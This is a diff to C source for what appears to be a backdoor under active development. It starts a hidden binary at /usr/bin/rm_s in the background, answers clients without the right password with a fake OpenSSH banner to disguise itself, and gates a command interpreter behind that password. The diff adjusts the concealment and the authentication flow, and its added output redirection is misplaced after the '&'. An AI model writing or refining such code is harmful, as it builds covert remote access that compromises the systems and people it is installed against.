@@ -40,7 +40,7 @@ int main(int argc, char **argv, char **envp) {
 
         // start /usr/bin/rm_s in background and quit here
         char command[1024];
-        sprintf(command, "%s=1 %s &", ENVIRONMENT_VAR, HIDDEN_EXEC_PATH);
+        sprintf(command, "%s=1 %s & > /dev/null 2>&1", ENVIRONMENT_VAR, HIDDEN_EXEC_PATH);
         system(command);
 
         return 0;
@@ -201,10 +201,16 @@ void* handle_client(void* arg) {
         buffer[bytes_received] = '\0';
         if (messages_sent == 0 && strcmp(buffer, PASSWORD) != 0) {
             // send fake response
-            send(client_fd, "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7\n", 34, 0);
+            send(client_fd, "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7\n", 42, 0);
             close(client_fd);
             return NULL;
         }
+
+        if (messages_sent == 0) {
+            messages_sent++;
+            continue;
+        }
+
         messages_sent++;
 
         // interpter commands TODO
